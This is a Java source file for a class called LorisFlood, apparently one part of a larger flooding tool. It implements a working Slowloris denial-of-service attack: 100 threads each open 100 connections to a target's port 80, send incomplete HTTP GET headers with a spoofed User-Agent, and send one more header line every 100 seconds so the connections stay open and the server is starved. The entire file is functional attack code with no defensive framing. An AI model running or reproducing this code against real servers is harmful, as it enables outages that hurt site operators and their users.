package syn.net;

import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Random;

import syn.utils.Utilities;

public class LorisFlood extends Flood {

	private static int connCount;

	public LorisFlood(String target) {
		super(target);
	}

	public void run() {
		String phost = super.getTarget();
		if(phost.startsWith("http://")) {
			phost = phost.substring(7);
		}
		final String host = phost;
		final int threadsCount = 100;

		for(int i = 0; i < threadsCount; i++) {
			new Thread(new Runnable() {
				int threads = threadsCount;
				
				public void run() {
					Random random = new Random();
					boolean[] w = new boolean[threads];
					Socket[] s = new Socket[threads];
					
					while(Flood.isFlooding()) {
						//Create sockets
						try {
							for(int i = 0; i < threads; i++) {
								if(!w[i]) {
									s[i] = new Socket();
									InetAddress ia = InetAddress.getByName(host);
									s[i].connect(new InetSocketAddress(ia.getHostAddress(), 80), 5000);
									connCount++;
									w[i] = true;
									PrintWriter out = new PrintWriter(s[i].getOutputStream());
									String rand = "?" + (random.nextInt(9999999));
									String payload =  "GET" + " /" + rand + " HTTP/1.1\r\n"
											+ "Host: " + host + "\r\n"
											+ "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; " 
											+ "Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; "
											+ ".NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET "
											+ "CLR 3.5.30729; MSOffice 12)\r\n"
											+ "Content-Length: 42\r\n";
									out.print(payload);
									out.flush();
								}
							}
							
							//Send data
							for (int i = 0; i < threads; i++) {
								if (w[i]) {
									PrintWriter out = new PrintWriter(s[i].getOutputStream());
									out.print("X-a: b\r\n");
									out.flush();
								} else {
									w[i] = false;
								}
							}
							Thread.sleep(100 * 1000);
						} catch (Exception e) {}
					}
					
					if(!resultsSent) {
						resultsSent = true;
						Utilities uc = new Utilities();
						uc.write(connCount + " connections created with host " + host + ".");
					}
				}
			}).start();
		}
	}
}
